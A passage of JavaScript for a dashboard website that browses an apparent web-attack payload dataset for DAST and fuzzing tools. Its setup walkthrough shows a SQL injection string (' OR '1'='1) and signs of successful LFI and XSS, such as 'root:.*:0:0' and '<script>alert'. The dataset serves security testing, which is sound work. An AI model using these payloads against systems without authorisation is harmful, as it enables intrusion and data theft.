      });
    });
  }

  /* ─── RENDER: SOURCES ─── */
  function renderSources() {
    const grid = $('#sourcesGrid');
    grid.innerHTML = SOURCES.map(s => (
      '<div class="source-card">' +
        '<div class="source-card-top">' +
          '<span class="source-logo">' + escHtml(s.name.charAt(0)) + '</span>' +
          '<div><h3>' + escHtml(s.name) + '</h3><div class="source-by">' + escHtml(s.by) + '</div></div>' +
        '</div>' +
        '<p>' + escHtml(s.desc) + '</p>' +
        (s.url !== '#' ? '<a href="' + escAttr(s.url) + '" class="source-link" target="_blank" rel="noopener">Visit Repository ' + ICON.ext + '</a>' : '') +
      '</div>'
    )).join('');
  }

  /* ─── RENDER: LIBRARY ─── */
  function renderLibrary(items) {
    const grid = $('#libraryGrid');
    const empty = $('#emptyState');
    const count = $('#resultCount');
    count.innerHTML = 'Showing <strong>' + items.length + '</strong> of <strong>' + LIBRARY_ITEMS.length + '</strong> categories';

    if (!items.length) {
      grid.innerHTML = '';
      empty.classList.add('show');
      return;
    }
    empty.classList.remove('show');

    grid.innerHTML = items.map(item => (
      '<div class="lib-card" data-id="' + item.id + '">' +
        '<div class="lib-card-header">' +
          '<span class="lib-card-id">' + item.id + '</span>' +
          '<span class="badge ' + item.severity.cls + '">' + item.severity.label + '</span>' +
        '</div>' +
        '<div class="lib-card-body">' +
          '<div class="lib-card-title">' + escHtml(item.category) + '</div>' +
          '<div class="lib-card-desc">' + escHtml(item.description) + '</div>' +
        '</div>' +
        '<div class="lib-card-example">' +
          '<div class="example-label">Example payload</div>' +
          '<div class="code-inline"><code>' + escHtml(item.example) + '</code>' + copyBtn(item.example) + '</div>' +
        '</div>' +
        '<div class="lib-card-footer">' +
          '<span class="meta badge badge-cyan">' + fmt(item.count) + '</span>' +
          '<span class="meta">' + ICON.target + item.injectionPoint + '</span>' +
          '<span class="spacer"></span>' +
          '<span class="view-link">Details &rarr;</span>' +
        '</div>' +
      '</div>'
    )).join('');

    $$('#libraryGrid .lib-card').forEach(card => {
      card.addEventListener('click', e => {
        if (e.target.closest('.copy-mini')) return; // let copy handle itself
        const item = LIBRARY_ITEMS.find(i => i.id === card.dataset.id);
        if (item) openModal(item);
      });
    });
  }

  /* ─── FILTER / SORT ─── */
  function applyFilters() {
    const term = ($('#searchInput').value || '').toLowerCase().trim();
    const catF = $('#filterCategory').value;
    const srcF = $('#filterSource').value;
    const sort = $('#sortBy').value;

    let list = LIBRARY_ITEMS.filter(it => {
      const matchSearch = !term ||
        it.category.toLowerCase().includes(term) ||
        it.source.toLowerCase().includes(term) ||
        it.description.toLowerCase().includes(term) ||
        it.severity.label.toLowerCase().includes(term);
      const matchCat = catF === 'all' || it.category === catF;
      const matchSrc = srcF === 'all' || it.source.includes(srcF);
      return matchSearch && matchCat && matchSrc;
    });

    list = list.slice().sort((a, b) => {
      switch (sort) {
        case 'count-asc': return a.count - b.count;
        case 'name-asc': return a.category.localeCompare(b.category);
        case 'name-desc': return b.category.localeCompare(a.category);
        default: return b.count - a.count;
      }
    });
    renderLibrary(list);
  }

  function populateFilters() {
    const catSel = $('#filterCategory');
    const srcSel = $('#filterSource');
    const srcs = new Set();
    LIBRARY_ITEMS.forEach(it => it.source.split(', ').forEach(s => srcs.add(s)));
    CATEGORIES.forEach(c => {
      const o = document.createElement('option');
      o.value = c.name; o.textContent = c.name;
      catSel.appendChild(o);
    });
    Array.from(srcs).sort().forEach(s => {
      const o = document.createElement('option');
      o.value = s; o.textContent = s;
      srcSel.appendChild(o);
    });
  }

  /* ─── MODAL ─── */
  function openModal(item) {
    $('#modalId').textContent = item.id + ' · ' + item.severity.label + ' severity';
    $('#modalTitle').textContent = item.category;
    $('#modalBody').innerHTML = (
      '<div class="detail-grid">' +
        '<div class="detail-row"><div class="detail-label">Total Payloads</div><div class="detail-value">' + fmt(item.count) + '</div></div>' +
        '<div class="detail-row"><div class="detail-label">Dataset Share</div><div class="detail-value">' + (item.share * 100).toFixed(2) + '%</div></div>' +
        '<div class="detail-row"><div class="detail-label">Injection Point</div><div class="detail-value">' + item.injectionPoint + '</div></div>' +
        '<div class="detail-row"><div class="detail-label">Expected Status</div><div class="detail-value">HTTP ' + item.statusCode + '</div></div>' +
        '<div class="detail-row full"><div class="detail-label">Description</div><div class="detail-value">' + escHtml(item.description) + '</div></div>' +
        '<div class="detail-row full"><div class="detail-label">Sources</div><div class="detail-value">' + escHtml(item.source) + '</div></div>' +
      '</div>' +
      '<div class="example-label">Example payload</div>' +
      '<div class="code-block-lg"><code>' + escHtml(item.example) + '</code>' + copyBtn(item.example) + '</div>'
    );
    $('#modalOverlay').classList.add('open');
    document.body.style.overflow = 'hidden';
  }
  function closeModal() {
    $('#modalOverlay').classList.remove('open');
    document.body.style.overflow = '';
  }

  /* ─── WALKTHROUGH ACCORDION ─── */
  const STEPS = [
    { t: 'Clone or Download', s: 'Get the dataset onto your machine', body:
      '<p>Start by cloning the repository or downloading the latest release from GitHub.</p>' + codeBlock('git clone https://github.com/HarlequinCS/Veritas_Payloads.git') },
    { t: 'Choose Your Format', s: 'Unified JSON or organized folders', body:
      '<p>The dataset is available as a single unified JSON file or split into category folders.</p>' + codeBlock(
'Veritas_Payloads/\n  owasp_top10_payloads.json   # Unified (123,918 entries)\n  organize_payloads.py        # Splitter tool\n  payloads/                   # Organized by category\n    injection_(xss)/query_parameter.json\n    injection_(sqli)/query_parameter.json') },
    { t: 'Understand the Schema', s: 'Consistent, integration-ready structure', body:
      '<p>Each payload entry follows a consistent structure for easy integration.</p>' + codeBlock(
'{\n  "payload_id": "OWP-0001",\n  "vulnerability_category": "Injection (SQLi)",\n  "injection_point": "query_parameter",\n  "payload_string": "\' OR \'1\'=\'1",\n  "validation": { "expected_status_code": 200, "success_regex": "error|sql" }\n}') },
    { t: 'Load in Your Scanner', s: 'Feed payloads into your DAST/fuzzer', body:
      '<p>Use the organized files to feed your DAST or fuzzing tool. Each file targets a specific category and injection point.</p>' + codeBlock(
'import json\n\nwith open("payloads/injection_(sqli)/query_parameter.json") as f:\n    payloads = json.load(f)\n\nfor p in payloads:\n    print(f"{p[\'payload_id\']}: {p[\'payload_string\']}")') },
    { t: 'Re-organize Anytime', s: 'Regenerate category folders', body:
      '<p>Run the included Python script to re-generate the organized folders after modifications.</p>' + codeBlock('python organize_payloads.py') },
    { t: 'Interpret Results', s: 'Validation hints per category', body:
      '<p>Each payload includes validation hints — expected status codes and success regex patterns — to verify if a vulnerability was triggered.</p>' +
      '<div class="tips-grid">' +
        tip('SQL Injection', 'Watch for: <code>syntax error</code>, <code>SQL</code>, unexpected 200 responses') +
        tip('XSS', 'Watch for: <code>&lt;script&gt;alert</code> in response, DOM changes') +
        tip('LFI/RFI', 'Watch for: <code>root:.*:0:0</code>, <code>boot.ini</code>, file contents') +
        tip('Open Redirect', 'Watch for: <code>Location:</code> header with 302 status') +
      '</div>' },
  ];
  function codeBlock(code) { return '<div class="code-block">' + escHtml(code) + copyBtn(code) + '</div>'; }
  function tip(title, span) { return '<div class="tip-card"><strong>' + title + '</strong><span>' + span + '</span></div>'; }

  function renderAccordion() {
    const acc = $('#accordion');
    acc.innerHTML = STEPS.map((st, i) => (
      '<div class="acc-item' + (i === 0 ? ' open' : '') + '">' +
        '<button class="acc-head">' +
          '<span class="acc-num">' + String(i + 1).padStart(2, '0') + '</span>' +
          '<span class="acc-titles"><h3>' + escHtml(st.t) + '</h3><p>' + escHtml(st.s) + '</p></span>' +
          ICON.chevron +
        '</button>' +
        '<div class="acc-body"><div class="acc-body-inner">' + st.body + '</div></div>' +
      '</div>'
    )).join('');

    $$('#accordion .acc-item').forEach(item => {
      const head = $('.acc-head', item);
      const body = $('.acc-body', item);
      const setHeight = () => { body.style.maxHeight = item.classList.contains('open') ? body.scrollHeight + 'px' : '0px'; };
      if (item.classList.contains('open')) requestAnimationFrame(setHeight);
      head.addEventListener('click', () => {
        item.classList.toggle('open');
        $$('#accordion .acc-item').forEach(o => { $('.acc-body', o).style.maxHeight = o.classList.contains('open') ? $('.acc-body', o).scrollHeight + 'px' : '0px'; });
      });
    });
  }

  /* ─── VIEW ROUTER ─── */
  function setView(id) {
    const view = VIEWS.find(v => v.id === id) || VIEWS[0];
    $$('.view').forEach(v => v.classList.toggle('active', v.id === 'view-' + view.id));
    $$('.nav-item').forEach(n => n.classList.toggle('active', n.dataset.view === view.id));
    $('#pageTitle').textContent = view.title;
    $('#pageSubtitle').textContent = view.sub;
    if (history.replaceState) history.replaceState(null, '', '#' + view.id);
    window.scrollTo({ top: 0, behavior: 'smooth' });
    closeSidebar();
    activeView = view.id;
    if (view.id === 'overview') { setTimeout(animateBars, 80); animateCounters(); if (globe) globe.start(); }
    else if (globe) globe.stop();
    if (view.id === 'walkthrough') requestAnimationFrame(refreshAccordion);
  }

  function refreshAccordion() {
    $$('#accordion .acc-item').forEach(o => {
      const body = $('.acc-body', o);
      body.style.maxHeight = o.classList.contains('open') ? body.scrollHeight + 'px' : '0px';
    });
  }

  /* ═══════════════════════════════════════════════════════════════
     3D CYBER GLOBE — lightweight vanilla-canvas renderer (no libs)
     Orthographic wireframe sphere + glowing threat nodes + arc links
     + radar scan band + mouse parallax. Front-hemisphere culling for
     a true 3D read. Auto-pauses when hidden/off-screen; respects
     prefers-reduced-motion and downscales on mobile.
     ═══════════════════════════════════════════════════════════════ */
  function createGlobe() {
    const wrap = $('#globeVisual');
    const canvas = $('#globeCanvas');
    if (!wrap || !canvas) return null;
    const ctx = canvas.getContext('2d');
    const PI = Math.PI;
    const reduce = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
    const NODE_HEX = ['#22d3ee', '#818cf8', '#34d399', '#f472b6'];

    let W = 0, H = 0, cx = 0, cy = 0, R = 0, dpr = 1;
    let raf = null, running = false, t = 0;
    let autoYaw = 0, yawOff = 0, yawTarget = 0;
    const basePitch = -0.34;
    let pitch = basePitch, pitchTarget = 0;

    let latLines = [], lonLines = [], nodes = [], arcs = [];

    const isMobile = () => window.innerWidth <= 620;
    const sph = (phi, th) => [Math.cos(phi) * Math.cos(th), Math.sin(phi), Math.cos(phi) * Math.sin(th)];

    function slerpPts(a, b, seg) {
      let dot = a[0] * b[0] + a[1] * b[1] + a[2] * b[2];
      dot = Math.max(-1, Math.min(1, dot));
      const om = Math.acos(dot), so = Math.sin(om), out = [];
      for (let i = 0; i <= seg; i++) {
        const tt = i / seg;
        let w1, w2;
        if (so < 1e-4) { w1 = 1 - tt; w2 = tt; }
        else { w1 = Math.sin((1 - tt) * om) / so; w2 = Math.sin(tt * om) / so; }
        const alt = 1 + 0.22 * Math.sin(tt * PI);
        out.push([(a[0] * w1 + b[0] * w2) * alt, (a[1] * w1 + b[1] * w2) * alt, (a[2] * w1 + b[2] * w2) * alt]);
      }
      return out;
    }

    function buildGeometry() {
      latLines = []; lonLines = [];
      const samp = isMobile() ? 36 : 54;
      for (let lat = -60; lat <= 60; lat += 20) {
        const phi = lat * PI / 180, pts = [];
        for (let i = 0; i <= samp; i++) pts.push(sph(phi, i / samp * 2 * PI));
        latLines.push(pts);
      }
      for (let lon = 0; lon < 180; lon += 20) {
        const th = lon * PI / 180, pts = [];
        for (let i = 0; i <= samp; i++) pts.push(sph((-90 + i / samp * 180) * PI / 180, th));
        lonLines.push(pts);
      }
      const n = isMobile() ? 16 : 28;
      nodes = [];
      for (let i = 0; i < n; i++) {
        nodes.push({
          v: sph((Math.random() * 150 - 75) * PI / 180, Math.random() * 2 * PI),
          ph: Math.random() * 6.28,
          r: 1.6 + Math.random() * 1.4,
          c: NODE_HEX[i % NODE_HEX.length],
        });
      }
      const na = isMobile() ? 5 : 10;
      arcs = [];
      for (let i = 0; i < na; i++) {
        const a = nodes[(Math.random() * nodes.length) | 0];
        const b = nodes[(Math.random() * nodes.length) | 0];
        if (a === b) continue;
        arcs.push({ pts: slerpPts(a.v, b.v, 26), t: Math.random(), sp: 0.0035 + Math.random() * 0.004, c: a.c });
      }
      const counter = $('#globeNodeCount');
      if (counter) counter.textContent = nodes.length * 4 + 24;
    }

    function project(v) {
      const cyw = Math.cos(autoYaw + yawOff), syw = Math.sin(autoYaw + yawOff);
      const x1 = v[0] * cyw + v[2] * syw, z1 = -v[0] * syw + v[2] * cyw, y1 = v[1];
      const cp = Math.cos(pitch), sp = Math.sin(pitch);
      const y2 = y1 * cp - z1 * sp, z2 = y1 * sp + z1 * cp;
      return { x: cx + x1 * R, y: cy - y2 * R, z: z2 };
    }

    /* front-hemisphere-only stroke for a real 3D wireframe look */
    function strokeFront(pts, color, alpha, width) {
      ctx.beginPath();
      let pen = false;
      for (let i = 0; i < pts.length; i++) {
        const p = project(pts[i]);
        if (p.z >= -0.02) {
          if (!pen) { ctx.moveTo(p.x, p.y); pen = true; }
          else ctx.lineTo(p.x, p.y);
        } else pen = false;
      }
      ctx.strokeStyle = color.replace('ALPHA', alpha.toFixed(3));
      ctx.lineWidth = width;
      ctx.stroke();
    }

    function dot(x, y, r, hex, a) {
      ctx.globalAlpha = a * 0.22; ctx.fillStyle = hex;
      ctx.beginPath(); ctx.arc(x, y, r * 3.4, 0, 6.283); ctx.fill();
      ctx.globalAlpha = a; ctx.beginPath(); ctx.arc(x, y, r, 0, 6.283); ctx.fill();
      ctx.globalAlpha = 1;
    }

    function draw() {
      ctx.clearRect(0, 0, W, H);
      if (R <= 0) return;

      // soft inner sphere shading
      const grad = ctx.createRadialGradient(cx - R * 0.3, cy - R * 0.3, R * 0.1, cx, cy, R);
      grad.addColorStop(0, 'rgba(34,211,238,0.06)');
      grad.addColorStop(1, 'rgba(8,12,20,0.0)');
      ctx.fillStyle = grad;
      ctx.beginPath(); ctx.arc(cx, cy, R, 0, 6.283); ctx.fill();

      // radar scan band (oscillating latitude)
      const scanY = Math.sin(t * 0.012);

      // grid wireframe
      for (const ln of lonLines) strokeFront(ln, 'rgba(34,211,238,ALPHA)', 0.16, 1);
      for (const ln of latLines) {
        const near = Math.abs(ln[0][1] - scanY) < 0.16;
        strokeFront(ln, near ? 'rgba(52,211,153,ALPHA)' : 'rgba(34,211,238,ALPHA)', near ? 0.5 : 0.16, near ? 1.4 : 1);
      }

      // arc connections + travelling pulse
      for (const arc of arcs) {
        strokeFront(arc.pts, 'rgba(129,140,248,ALPHA)', 0.28, 1);
        if (!reduce) { arc.t += arc.sp; if (arc.t > 1) arc.t -= 1; }
        const idx = Math.min(arc.pts.length - 1, Math.floor(arc.t * arc.pts.length));
        const p = project(arc.pts[idx]);
        if (p.z >= 0) dot(p.x, p.y, 1.8, arc.c, 0.9);
      }

      // threat nodes (front only) with pulse + scan highlight
      for (const nd of nodes) {
        const p = project(nd.v);
        if (p.z < 0) continue;
        const depth = 0.5 + 0.5 * (p.z / R);
        const pulse = reduce ? 0.8 : 0.55 + 0.45 * Math.sin(t * 0.05 + nd.ph);
        const hot = Math.abs(nd.v[1] - scanY) < 0.14;
        dot(p.x, p.y, (nd.r + (hot ? 1 : 0)) * (0.7 + depth * 0.6), hot ? '#34d399' : nd.c, pulse * (0.6 + depth * 0.4));
      }
    }

    function frame() {
      if (!running) return;
      t++;
      if (!reduce) autoYaw += 0.0024;
      yawOff += (yawTarget - yawOff) * 0.06;
      pitch += (basePitch + pitchTarget - pitch) * 0.06;
      draw();
      raf = requestAnimationFrame(frame);
    }

    function resize() {
      const rect = wrap.getBoundingClientRect();
      const w = rect.width, h = rect.height;
      if (w < 2 || h < 2) return;
      dpr = Math.min(window.devicePixelRatio || 1, isMobile() ? 1.25 : 1.75);
      W = w; H = h;
      canvas.width = Math.round(w * dpr);
      canvas.height = Math.round(h * dpr);
      ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
      cx = w / 2; cy = h / 2; R = Math.min(w, h) * 0.37;
      if (!running) draw();
    }

    function start() {
      resize();
      if (reduce) { draw(); return; }       // static frame fallback
      if (running) return;
      running = true; raf = requestAnimationFrame(frame);
    }
    function stop() {
      running = false;
      if (raf) { cancelAnimationFrame(raf); raf = null; }
    }

    // mouse parallax (pointer devices only)
    if (!reduce && window.matchMedia('(pointer: fine)').matches) {
      wrap.addEventListener('pointermove', e => {
        const rect = wrap.getBoundingClientRect();
        const nx = (e.clientX - rect.left) / rect.width - 0.5;
        const ny = (e.clientY - rect.top) / rect.height - 0.5;
        yawTarget = nx * 0.6;
        pitchTarget = ny * 0.5;
      });
      wrap.addEventListener('pointerleave', () => { yawTarget = 0; pitchTarget = 0; });
    }

    buildGeometry();
    return { start, stop, resize, rebuild() { buildGeometry(); resize(); } };
  }

  /* ─── COUNTER ANIMATION ─── */
  function animateCounters() {
    $$('#statsGrid .stat-value').forEach(el => {
      const target = parseInt(el.dataset.target, 10);
      const dur = 1400, start = performance.now();
      function step(now) {
        const p = Math.min((now - start) / dur, 1);
        const eased = 1 - Math.pow(1 - p, 3);
        el.textContent = fmt(Math.floor(eased * target));
        if (p < 1) requestAnimationFrame(step); else el.textContent = fmt(target);
      }
      requestAnimationFrame(step);
    });
  }

  /* ─── MOBILE SIDEBAR ─── */
  function openSidebar() { $('#sidebar').classList.add('open'); $('#backdrop').classList.add('show'); }
  function closeSidebar() { $('#sidebar').classList.remove('open'); $('#backdrop').classList.remove('show'); }

  /* ─── GLOBAL EVENTS ─── */
  function bindEvents() {
    $('#searchInput').addEventListener('input', applyFilters);
    $('#filterCategory').addEventListener('change', applyFilters);
    $('#filterSource').addEventListener('change', applyFilters);
    $('#sortBy').addEventListener('change', applyFilters);
    $('#resetFilters').addEventListener('click', () => {
      $('#searchInput').value = '';
      $('#filterCategory').value = 'all';
      $('#filterSource').value = 'all';
      $('#sortBy').value = 'count-desc';
      applyFilters();
    });

    $('#modalClose').addEventListener('click', closeModal);
    $('#modalOverlay').addEventListener('click', e => { if (e.target.id === 'modalOverlay') closeModal(); });
    document.addEventListener('keydown', e => { if (e.key === 'Escape') closeModal(); });

    $('#menuBtn').addEventListener('click', openSidebar);
    $('#backdrop').addEventListener('click', closeSidebar);

    $$('[data-goto]').forEach(b => b.addEventListener('click', () => setView(b.dataset.goto)));

    // delegated copy handler
    document.addEventListener('click', e => {
      const btn = e.target.closest('.copy-mini');
      if (!btn) return;
      e.stopPropagation();
      copyText(btn.getAttribute('data-copy'));
    });

    // globe: resize (debounced) + rebuild on breakpoint change + pause when tab hidden
    let resizeTimer;
    window.addEventListener('resize', () => {
      clearTimeout(resizeTimer);
      resizeTimer = setTimeout(() => {
        if (!globe) return;
        const nowMobile = window.innerWidth <= 620;
        if (nowMobile !== lastIsMobile) { lastIsMobile = nowMobile; globe.rebuild(); }
        else globe.resize();
      }, 160);
    });
    document.addEventListener('visibilitychange', () => {
      if (!globe) return;
      if (document.hidden) globe.stop();
      else if (activeView === 'overview') globe.start();
    });
  }

  /* ─── INIT ─── */
  function init() {
    renderNav();
    renderStats();
    renderBarChart();
    renderDonut();
    renderCatList();
    populateFilters();
    applyFilters();
    renderSources();
    renderAccordion();
    globe = createGlobe();
    bindEvents();

    // initial view from hash
    const hash = (location.hash || '').replace('#', '');
    if (VIEWS.some(v => v.id === hash)) setView(hash);
    else { activeView = 'overview'; animateCounters(); setTimeout(animateBars, 200); if (globe) globe.start(); }
  }

  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', init);
  else init();
})();
